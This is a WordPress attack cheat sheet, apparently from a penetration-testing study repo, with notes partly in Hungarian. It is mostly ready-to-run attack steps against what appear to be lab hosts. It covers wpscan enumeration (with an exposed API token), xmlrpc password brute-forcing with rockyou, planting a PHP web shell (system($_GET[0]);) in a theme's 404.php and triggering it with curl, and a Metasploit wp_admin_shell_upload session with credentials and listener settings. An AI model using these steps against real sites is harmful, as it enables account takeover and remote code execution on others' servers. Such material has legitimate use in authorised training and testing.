# wordpress
## basic enumeration
sudo wpscan --url http://10.10.13.59/ --enumerate --api-token WjrpE4gHXHSJWdMRFd65wbgll05shgqVteeasj8sK1Y  
## login bruteforcing
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local  
### Error
* van hogy errort dob es kiirja, hogy vigyuk lejjebb a thread-et
* vegyuk le 1-re
* ha az se jo, akkor inkabb hdyraval torjuk (mukodott mar a hydra legutobb, csak a pontos html output-bol kell masolni a 'false text'-et es nem a honlap szovegbol)
## code execution with obtained credentials
### manually
go to Appareance / theme editor  
select an inactive theme and select a file (like 404.php)  
insert an rce code sample, like this: system($_GET[0]);  
save  
curl http://10.10.10.1/wp-content/themes/<theme_name>/404.php?0=id
example  
<pre>
# twentyfifteen-en belul a 404.php-t tipikusan meg lehet szerkeszteni
# van mar nyito es csuko php tag oda koze be lehet illeszteni a get_header(); ele es akkor tuti jo lesz

# [Twenty Fifteen: 404 Template (404.php)] (backslash jelek nem kellenek csak a github hulyen kezeli a tageket)
</pre>
![image](https://github.com/VajdaGergely/EJPT_pentesting_cheatsheet/assets/39236093/0b8705de-5c2f-414b-a7f0-3f96bfbf481f)
<pre>
# aztan bongeszobol vagy curl-el meg lehet hivni
curl -i -s http://10.10.3.254/wp-content/themes/twentyfifteen/404.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
* KIS NAGY BETU BAROMIRA SZAMIT A THEME ELNEVEZESENEL !!!!!!!! CASE SENSITIVE !!!!!
  * KIS BETUVEL KELL IRNI MINDENT !!!
### metasploit
msf6 > use exploit/unix/webapp/wp_admin_shell_upload  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run  
